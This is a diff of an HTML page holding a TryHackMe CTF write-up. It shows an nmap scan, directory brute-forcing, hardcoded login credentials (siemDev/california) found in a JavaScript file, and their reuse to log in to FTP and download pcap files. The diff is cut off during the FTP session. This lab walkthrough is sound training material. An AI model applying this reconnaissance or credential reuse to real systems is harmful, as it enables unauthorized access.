@@ -66,8 +66,8 @@
             <div class="text-slate-500 text-sm">2024-12-30 • tryhackme, ctf</div>
         </header>
         <div class="markdown-content">
-            <pre class="codehilite"><code>`PORT      STATE SERVICE REASON  VERSION 22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 c2842ac1225a10f16616dda0f6046295 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf7Zvn7fOyAWUwEI2aH/k8AyPehxzzuNC1v4AAlhDa4Off4085gRIH/EXpjOoZSBvo8magsCH32JaKMMc59FSK4canP2I0VrXwkEX0F8PjA1TV4qgqXJI0zNVwFrfBORDdlCPNYiqRNFp1vaxTqLOFuHt5r34134yRwczxTsD4Uf9Z6c7Yzr0GV6NL3baGHDeSZ/msTiFKFzLTTKbFkbU4SQYc7jIWjl0ylQ6qtWivBiavEWTwkHHKWGg9WEdFpU2zjeYTrDNnaEfouD67dXznI+FiiTiFf4KC9/1C+msppC0o77nxTGI0352wtBV9KjTU/Aja+zSTMDxoGVvo/BabczvRCTwhXxzVpWNe3YTGeoNESyUGLKA6kUBfFNICrJD2JR7pXYKuZVwpJUUCpy5n6MetnonUo0SoMg/fzqMWw2nCZOpKzVo9OdD8R/ZTnX/iQKGNNvgD7RkbxxFK5OA9TlvfvuRUQQaQP7+UctsaqG2F9gUfWorSdizFwfdKvRU= |   256 429e2ff63e5adb51996271c48c223ebb (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNIiJc4hdfcu/HtdZN1fyz/hU1SgSas1Lk/ncNc9UkfSDG2SQziJ/5SEj1AQhK0T4NdVeaMSDEunQnrmD1tJ9hg= |   256 2ea0a56cd983e0016cb98a609b638672 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZhkboYdSkdR3n1G4sQtN4uO3hy89JxYkizKi6Sd/Ky 80/tcp    open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu)) | http-methods:  |_  Supported Methods: OPTIONS HEAD GET POST |_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache/2.4.41 (Ubuntu) 37370/tcp open  ftp     syn-ack vsftpd 3.0.3`
-</code></pre>
+            <div class="codehilite"><pre><span></span><code><span class="sb">`PORT      STATE SERVICE REASON  VERSION 22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 c2842ac1225a10f16616dda0f6046295 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf7Zvn7fOyAWUwEI2aH/k8AyPehxzzuNC1v4AAlhDa4Off4085gRIH/EXpjOoZSBvo8magsCH32JaKMMc59FSK4canP2I0VrXwkEX0F8PjA1TV4qgqXJI0zNVwFrfBORDdlCPNYiqRNFp1vaxTqLOFuHt5r34134yRwczxTsD4Uf9Z6c7Yzr0GV6NL3baGHDeSZ/msTiFKFzLTTKbFkbU4SQYc7jIWjl0ylQ6qtWivBiavEWTwkHHKWGg9WEdFpU2zjeYTrDNnaEfouD67dXznI+FiiTiFf4KC9/1C+msppC0o77nxTGI0352wtBV9KjTU/Aja+zSTMDxoGVvo/BabczvRCTwhXxzVpWNe3YTGeoNESyUGLKA6kUBfFNICrJD2JR7pXYKuZVwpJUUCpy5n6MetnonUo0SoMg/fzqMWw2nCZOpKzVo9OdD8R/ZTnX/iQKGNNvgD7RkbxxFK5OA9TlvfvuRUQQaQP7+UctsaqG2F9gUfWorSdizFwfdKvRU= |   256 429e2ff63e5adb51996271c48c223ebb (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNIiJc4hdfcu/HtdZN1fyz/hU1SgSas1Lk/ncNc9UkfSDG2SQziJ/5SEj1AQhK0T4NdVeaMSDEunQnrmD1tJ9hg= |   256 2ea0a56cd983e0016cb98a609b638672 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZhkboYdSkdR3n1G4sQtN4uO3hy89JxYkizKi6Sd/Ky 80/tcp    open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu)) | http-methods:  |_  Supported Methods: OPTIONS HEAD GET POST |_http-title: Site doesn&#39;t have a title (text/html). |_http-server-header: Apache/2.4.41 (Ubuntu) 37370/tcp open  ftp     syn-ack vsftpd 3.0.3`</span>
+</code></pre></div>
 
 <blockquote>
 <p>3 ports</p>
@@ -75,246 +75,246 @@
 80<br />
 37370</p>
 </blockquote>
-<pre class="codehilite"><code>❯ feroxbuster -u 'http://v.thm' -w /usr/share/wordlists/dirb/big.txt
+<div class="codehilite"><pre><span></span><code><span class="err">❯</span><span class="w"> </span><span class="nt">feroxbuster</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s1">&#39;http://v.thm&#39;</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="o">/</span><span class="nt">usr</span><span class="o">/</span><span class="nt">share</span><span class="o">/</span><span class="nt">wordlists</span><span class="o">/</span><span class="nt">dirb</span><span class="o">/</span><span class="nt">big</span><span class="p">.</span><span class="nc">txt</span>
 
-403      GET        9l       28w      270c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-404      GET        9l       31w      267c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
-200      GET      140l      394w     3940c http://v.thm/gallery/gallery.html
-200      GET       38l      129w     1163c http://v.thm/index.html
-200      GET       52l      106w      945c http://v.thm/styles.css
-200      GET       32l       61w      924c http://v.thm/pricing/pricing.html
-200      GET       38l      129w     1163c http://v.thm/
-200      GET        3l       10w       57c http://v.thm/pricing/note.txt
-301      GET        9l       28w      300c http://v.thm/gallery =&gt; http://v.thm/gallery/
-301      GET        9l       28w      300c http://v.thm/pricing =&gt; http://v.thm/pricing/
-301      GET        9l       28w      299c http://v.thm/static =&gt; http://v.thm/static/
-[####################] - 3m     20483/20483   0s      found:9       errors:7      
-[####################] - 3m     20469/20469   105/s   http://v.thm/ 
-[####################] - 0s     20469/20469   43184/s http://v.thm/gallery/ =&gt; Directory listing (add --scan-dir-listings to scan)
-[####################] - 1s     20469/20469   21615/s http://v.thm/pricing/ =&gt; Directory listing (add --scan-dir-listings to scan)
-[####################] - 0s     20469/20469   58483/s http://v.thm/static/ =&gt; Directory listing (add --scan-dir-listings to scan) 
-</code></pre>
+<span class="nt">403</span><span class="w">      </span><span class="nt">GET</span><span class="w">        </span><span class="nt">9l</span><span class="w">       </span><span class="nt">28w</span><span class="w">      </span><span class="nt">270c</span><span class="w"> </span><span class="nt">Auto-filtering</span><span class="w"> </span><span class="nt">found</span><span class="w"> </span><span class="nt">404-like</span><span class="w"> </span><span class="nt">response</span><span class="w"> </span><span class="nt">and</span><span class="w"> </span><span class="nt">created</span><span class="w"> </span><span class="nt">new</span><span class="w"> </span><span class="nt">filter</span><span class="o">;</span><span class="w"> </span><span class="nt">toggle</span><span class="w"> </span><span class="nt">off</span><span class="w"> </span><span class="nt">with</span><span class="w"> </span><span class="nt">--dont-filter</span>
+<span class="nt">404</span><span class="w">      </span><span class="nt">GET</span><span class="w">        </span><span class="nt">9l</span><span class="w">       </span><span class="nt">31w</span><span class="w">      </span><span class="nt">267c</span><span class="w"> </span><span class="nt">Auto-filtering</span><span class="w"> </span><span class="nt">found</span><span class="w"> </span><span class="nt">404-like</span><span class="w"> </span><span class="nt">response</span><span class="w"> </span><span class="nt">and</span><span class="w"> </span><span class="nt">created</span><span class="w"> </span><span class="nt">new</span><span class="w"> </span><span class="nt">filter</span><span class="o">;</span><span class="w"> </span><span class="nt">toggle</span><span class="w"> </span><span class="nt">off</span><span class="w"> </span><span class="nt">with</span><span class="w"> </span><span class="nt">--dont-filter</span>
+<span class="nt">200</span><span class="w">      </span><span class="nt">GET</span><span class="w">      </span><span class="nt">140l</span><span class="w">      </span><span class="nt">394w</span><span class="w">     </span><span class="nt">3940c</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span><span class="nt">gallery</span><span class="o">/</span><span class="nt">gallery</span><span class="p">.</span><span class="nc">html</span>
+<span class="nt">200</span><span class="w">      </span><span class="nt">GET</span><span class="w">       </span><span class="nt">38l</span><span class="w">      </span><span class="nt">129w</span><span class="w">     </span><span class="nt">1163c</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span><span class="nt">index</span><span class="p">.</span><span class="nc">html</span>
+<span class="nt">200</span><span class="w">      </span><span class="nt">GET</span><span class="w">       </span><span class="nt">52l</span><span class="w">      </span><span class="nt">106w</span><span class="w">      </span><span class="nt">945c</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span><span class="nt">styles</span><span class="p">.</span><span class="nc">css</span>
+<span class="nt">200</span><span class="w">      </span><span class="nt">GET</span><span class="w">       </span><span class="nt">32l</span><span class="w">       </span><span class="nt">61w</span><span class="w">      </span><span class="nt">924c</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span><span class="nt">pricing</span><span class="o">/</span><span class="nt">pricing</span><span class="p">.</span><span class="nc">html</span>
+<span class="nt">200</span><span class="w">      </span><span class="nt">GET</span><span class="w">       </span><span class="nt">38l</span><span class="w">      </span><span class="nt">129w</span><span class="w">     </span><span class="nt">1163c</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span>
+<span class="nt">200</span><span class="w">      </span><span class="nt">GET</span><span class="w">        </span><span class="nt">3l</span><span class="w">       </span><span class="nt">10w</span><span class="w">       </span><span class="nt">57c</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span><span class="nt">pricing</span><span class="o">/</span><span class="nt">note</span><span class="p">.</span><span class="nc">txt</span>
+<span class="nt">301</span><span class="w">      </span><span class="nt">GET</span><span class="w">        </span><span class="nt">9l</span><span class="w">       </span><span class="nt">28w</span><span class="w">      </span><span class="nt">300c</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span><span class="nt">gallery</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span><span class="nt">gallery</span><span class="o">/</span>
+<span class="nt">301</span><span class="w">      </span><span class="nt">GET</span><span class="w">        </span><span class="nt">9l</span><span class="w">       </span><span class="nt">28w</span><span class="w">      </span><span class="nt">300c</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span><span class="nt">pricing</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span><span class="nt">pricing</span><span class="o">/</span>
+<span class="nt">301</span><span class="w">      </span><span class="nt">GET</span><span class="w">        </span><span class="nt">9l</span><span class="w">       </span><span class="nt">28w</span><span class="w">      </span><span class="nt">299c</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span><span class="nt">static</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span><span class="nt">static</span><span class="o">/</span>
+<span class="cp">[</span><span class="err">####################</span><span class="cp">]</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">3m</span><span class="w">     </span><span class="nt">20483</span><span class="o">/</span><span class="nt">20483</span><span class="w">   </span><span class="nt">0s</span><span class="w">      </span><span class="nt">found</span><span class="p">:</span><span class="nd">9</span><span class="w">       </span><span class="nt">errors</span><span class="p">:</span><span class="nd">7</span><span class="w">      </span>
+<span class="cp">[</span><span class="err">####################</span><span class="cp">]</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">3m</span><span class="w">     </span><span class="nt">20469</span><span class="o">/</span><span class="nt">20469</span><span class="w">   </span><span class="nt">105</span><span class="o">/</span><span class="nt">s</span><span class="w">   </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span><span class="w"> </span>
+<span class="cp">[</span><span class="err">####################</span><span class="cp">]</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">0s</span><span class="w">     </span><span class="nt">20469</span><span class="o">/</span><span class="nt">20469</span><span class="w">   </span><span class="nt">43184</span><span class="o">/</span><span class="nt">s</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span><span class="nt">gallery</span><span class="o">/</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nt">Directory</span><span class="w"> </span><span class="nt">listing</span><span class="w"> </span><span class="o">(</span><span class="nt">add</span><span class="w"> </span><span class="nt">--scan-dir-listings</span><span class="w"> </span><span class="nt">to</span><span class="w"> </span><span class="nt">scan</span><span class="o">)</span>
+<span class="cp">[</span><span class="err">####################</span><span class="cp">]</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">1s</span><span class="w">     </span><span class="nt">20469</span><span class="o">/</span><span class="nt">20469</span><span class="w">   </span><span class="nt">21615</span><span class="o">/</span><span class="nt">s</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span><span class="nt">pricing</span><span class="o">/</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nt">Directory</span><span class="w"> </span><span class="nt">listing</span><span class="w"> </span><span class="o">(</span><span class="nt">add</span><span class="w"> </span><span class="nt">--scan-dir-listings</span><span class="w"> </span><span class="nt">to</span><span class="w"> </span><span class="nt">scan</span><span class="o">)</span>
+<span class="cp">[</span><span class="err">####################</span><span class="cp">]</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">0s</span><span class="w">     </span><span class="nt">20469</span><span class="o">/</span><span class="nt">20469</span><span class="w">   </span><span class="nt">58483</span><span class="o">/</span><span class="nt">s</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">v</span><span class="p">.</span><span class="nc">thm</span><span class="o">/</span><span class="nt">static</span><span class="o">/</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nt">Directory</span><span class="w"> </span><span class="nt">listing</span><span class="w"> </span><span class="o">(</span><span class="nt">add</span><span class="w"> </span><span class="nt">--scan-dir-listings</span><span class="w"> </span><span class="nt">to</span><span class="w"> </span><span class="nt">scan</span><span class="o">)</span><span class="w"> </span>
+</code></pre></div>
 
 <blockquote>
 <p>in http://10.201.53.78/static/ see hidden dir http://10.201.53.78/static/00</p>
 </blockquote>
-<pre class="codehilite"><code>dev notes from valleyDev:
--add wedding photo examples
--redo the editing on #4
--remove /dev1243224123123
--check for SIEM alerts
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="nv">dev</span><span class="w"> </span><span class="nv">notes</span><span class="w"> </span><span class="nv">from</span><span class="w"> </span><span class="nv">valleyDev</span>:
+<span class="o">-</span><span class="nv">add</span><span class="w"> </span><span class="nv">wedding</span><span class="w"> </span><span class="nv">photo</span><span class="w"> </span><span class="nv">examples</span>
+<span class="o">-</span><span class="nv">redo</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">editing</span><span class="w"> </span><span class="nv">on</span><span class="w"> </span><span class="sc">#4</span>
+<span class="o">-</span><span class="nv">remove</span><span class="w"> </span><span class="o">/</span><span class="nv">dev1243224123123</span>
+<span class="o">-</span><span class="nv">check</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">SIEM</span><span class="w"> </span><span class="nv">alerts</span>
+</code></pre></div>
 
 <blockquote>
 <p>so find dev</p>
 </blockquote>
-<pre class="codehilite"><code>http://10.201.53.78/dev1243224123123/
+<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.201</span><span class="o">.</span><span class="mf">53.78</span><span class="o">/</span><span class="n">dev1243224123123</span><span class="o">/</span>
 
-have login forum
+<span class="n">have</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">forum</span>
 
-and saw two js file
+<span class="ow">and</span><span class="w"> </span><span class="n">saw</span><span class="w"> </span><span class="n">two</span><span class="w"> </span><span class="n">js</span><span class="w"> </span><span class="n">file</span>
 
-button.js
-dev.js
+<span class="n">button</span><span class="o">.</span><span class="n">js</span>
+<span class="n">dev</span><span class="o">.</span><span class="n">js</span>
 
-in dev.js
+<span class="ow">in</span><span class="w"> </span><span class="n">dev</span><span class="o">.</span><span class="n">js</span>
 
-    ```
-    &gt; loginButton.addEventListener(&quot;click&quot;, (e) =&gt; {
-    &gt; e.preventDefault();
-    &gt; const username = loginForm.username.value;
-    &gt; const password = loginForm.password.value;
+<span class="w">    </span><span class="err">```</span>
+<span class="w">    </span><span class="o">&gt;</span><span class="w"> </span><span class="n">loginButton</span><span class="o">.</span><span class="n">addEventListener</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="o">&gt;</span><span class="w"> </span><span class="n">e</span><span class="o">.</span><span class="n">preventDefault</span><span class="p">();</span>
+<span class="w">    </span><span class="o">&gt;</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">loginForm</span><span class="o">.</span><span class="n">username</span><span class="o">.</span><span class="n">value</span><span class="p">;</span>
+<span class="w">    </span><span class="o">&gt;</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">loginForm</span><span class="o">.</span><span class="n">password</span><span class="o">.</span><span class="n">value</span><span class="p">;</span>
 
-    &gt; if (username === &quot;siemDev&quot; &amp;&amp; password === &quot;california&quot;) {
-        &gt; window.location.href = &quot;/dev1243224123123/devNotes37370.txt&quot;;
-    &gt; } else {
-        &gt; loginErrorMsg.style.opacity = 1;
-    &gt; }
-&gt; })
+<span class="w">    </span><span class="o">&gt;</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">&quot;siemDev&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">&quot;california&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="o">&gt;</span><span class="w"> </span><span class="n">window</span><span class="o">.</span><span class="n">location</span><span class="o">.</span><span class="n">href</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;/dev1243224123123/devNotes37370.txt&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="o">&gt;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="o">&gt;</span><span class="w"> </span><span class="n">loginErrorMsg</span><span class="o">.</span><span class="n">style</span><span class="o">.</span><span class="n">opacity</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">    </span><span class="o">&gt;</span><span class="w"> </span><span class="p">}</span>
+<span class="o">&gt;</span><span class="w"> </span><span class="p">})</span>
 
-    ```
+<span class="w">    </span><span class="err">```</span>
 
-    So found username &amp; password after login saw another note
+<span class="w">    </span><span class="n">So</span><span class="w"> </span><span class="n">found</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">after</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="n">saw</span><span class="w"> </span><span class="n">another</span><span class="w"> </span><span class="n">note</span>
 
-                ```
-                &gt; dev notes for ftp server:
-                -stop reusing credentials
-                -check for any vulnerabilies
-                -stay up to date on patching
-                -change ftp port to normal port
-                ```
-</code></pre>
+<span class="w">                </span><span class="err">```</span>
+<span class="w">                </span><span class="o">&gt;</span><span class="w"> </span><span class="n">dev</span><span class="w"> </span><span class="n">notes</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">ftp</span><span class="w"> </span><span class="n">server</span><span class="p">:</span>
+<span class="w">                </span><span class="o">-</span><span class="n">stop</span><span class="w"> </span><span class="n">reusing</span><span class="w"> </span><span class="n">credentials</span>
+<span class="w">                </span><span class="o">-</span><span class="n">check</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">vulnerabilies</span>
+<span class="w">                </span><span class="o">-</span><span class="n">stay</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">date</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">patching</span>
+<span class="w">                </span><span class="o">-</span><span class="n">change</span><span class="w"> </span><span class="n">ftp</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">normal</span><span class="w"> </span><span class="n">port</span>
+<span class="w">                </span><span class="err">```</span>
+</code></pre></div>
 
 <blockquote>
 <p>so try to login wia ftp</p>
 </blockquote>
-<pre class="codehilite"><code>❯ ftp 10.201.53.78 37370
-Connected to 10.201.53.78.
-220 (vsFTPd 3.0.3)
-Name (10.201.53.78:kali): siemDev
-331 Please specify the password.
-Password: 
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp&gt; ls
-229 Entering Extended Passive Mode (|||27925|)
-150 Here comes the directory listing.
--rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
--rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
--rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
-226 Directory send OK.
-ftp&gt; dir
-229 Entering Extended Passive Mode (|||48954|)
-150 Here comes the directory listing.
--rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
--rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
--rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
-226 Directory send OK.
-ftp&gt; get siemFTP.pcapng
-local: siemFTP.pcapng remote: siemFTP.pcapng
-229 Entering Extended Passive Mode (|||31509|)
-150 Opening BINARY mode data connection for siemFTP.pcapng (7272 bytes).
-100% |**************************************************************************************************************|  7272       16.27 MiB/s    00:00 ETA
-226 Transfer complete.
-7272 bytes received in 00:02 (3.20 KiB/s)
-ftp&gt; get siemHTTP1.pcapng
-local: siemHTTP1.pcapng remote: siemHTTP1.pcapng
-229 Entering Extended Passive Mode (|||16349|)
-150 Opening BINARY mode data connection for siemHTTP1.pcapng (1978716 bytes).
-100% |**************************************************************************************************************|  1932 KiB   67.87 KiB/s    00:00 ETA
-226 Transfer complete.
-1978716 bytes received in 00:28 (67.00 KiB/s)
-ftp&gt; get siemHTTP2.pcapng
-local: siemHTTP2.pcapng remote: siemHTTP2.pcapng
-229 Entering Extended Passive Mode (|||46872|)
-150 Opening BINARY mode data connection for siemHTTP2.pcapng (1972448 bytes).
-100% |**************************************************************************************************************|  1926 KiB  108.25 KiB/s    00:00 ETA
-226 Transfer complete.
-1972448 bytes received in 00:18 (106.12 KiB/s)
-ftp&gt; 
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="err">❯</span><span class="w"> </span><span class="nx">ftp</span><span class="w"> </span><span class="m m-Double">10.201.53.78</span><span class="w"> </span><span class="mi">37370</span>
+<span class="nx">Connected</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="m m-Double">10.201.53.78</span><span class="p">.</span>
+<span class="mi">220</span><span class="w"> </span><span class="p">(</span><span class="nx">vsFTPd</span><span class="w"> </span><span class="m m-Double">3.0.3</span><span class="p">)</span>
+<span class="nx">Name</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">10.201.53.78</span><span class="p">:</span><span class="nx">kali</span><span class="p">):</span><span class="w"> </span><span class="nx">siemDev</span>
+<span class="mi">331</span><span class="w"> </span><span class="nx">Please</span><span class="w"> </span><span class="nx">specify</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">password</span><span class="p">.</span>
+<span class="nx">Password</span><span class="p">:</span><span class="w"> </span>
+<span class="mi">230</span><span class="w"> </span><span class="nx">Login</span><span class="w"> </span><span class="nx">successful</span><span class="p">.</span>
+<span class="nx">Remote</span><span class="w"> </span><span class="nx">system</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">UNIX</span><span class="p">.</span>
+<span class="nx">Using</span><span class="w"> </span><span class="nx">binary</span><span class="w"> </span><span class="nx">mode</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">transfer</span><span class="w"> </span><span class="nx">files</span><span class="p">.</span>
+<span class="nx">ftp</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">ls</span>
+<span class="mi">229</span><span class="w"> </span><span class="nx">Entering</span><span class="w"> </span><span class="nx">Extended</span><span class="w"> </span><span class="nx">Passive</span><span class="w"> </span><span class="nx">Mode</span><span class="w"> </span><span class="p">(</span><span class="o">|||</span><span class="mi">27925</span><span class="o">|</span><span class="p">)</span>
+<span class="mi">150</span><span class="w"> </span><span class="nx">Here</span><span class="w"> </span><span class="nx">comes</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">directory</span><span class="w"> </span><span class="nx">listing</span><span class="p">.</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="mi">1000</span><span class="w">     </span><span class="mi">1000</span><span class="w">         </span><span class="mi">7272</span><span class="w"> </span><span class="nx">Mar</span><span class="w"> </span><span class="mi">06</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="nx">siemFTP</span><span class="p">.</span><span class="nx">pcapng</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="mi">1000</span><span class="w">     </span><span class="mi">1000</span><span class="w">      </span><span class="mi">1978716</span><span class="w"> </span><span class="nx">Mar</span><span class="w"> </span><span class="mi">06</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="nx">siemHTTP1</span><span class="p">.</span><span class="nx">pcapng</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="mi">1000</span><span class="w">     </span><span class="mi">1000</span><span class="w">      </span><span class="mi">1972448</span><span class="w"> </span><span class="nx">Mar</span><span class="w"> </span><span class="mi">06</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="nx">siemHTTP2</span><span class="p">.</span><span class="nx">pcapng</span>
+<span class="mi">226</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">send</span><span class="w"> </span><span class="nx">OK</span><span class="p">.</span>
+<span class="nx">ftp</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">dir</span>
+<span class="mi">229</span><span class="w"> </span><span class="nx">Entering</span><span class="w"> </span><span class="nx">Extended</span><span class="w"> </span><span class="nx">Passive</span><span class="w"> </span><span class="nx">Mode</span><span class="w"> </span><span class="p">(</span><span class="o">|||</span><span class="mi">48954</span><span class="o">|</span><span class="p">)</span>
+<span class="mi">150</span><span class="w"> </span><span class="nx">Here</span><span class="w"> </span><span class="nx">comes</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">directory</span><span class="w"> </span><span class="nx">listing</span><span class="p">.</span>
+<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="w">    </span><span class="mi">1</span><span class="w"> </span><span class="mi">1000</span><span class="w">     </span><span class="mi">1000</span><span class="w">         </span><span class="mi">7272</span><span class="w"> </span><span class="nx">Mar</span><span class="w"> </span><span class="mi">06</span><span class="w">  </span><span class="mi">2023</span><span class="w"> </span><span class="nx">siemFTP</span><span class="p">.</span><span class="nx">pcapng</span>
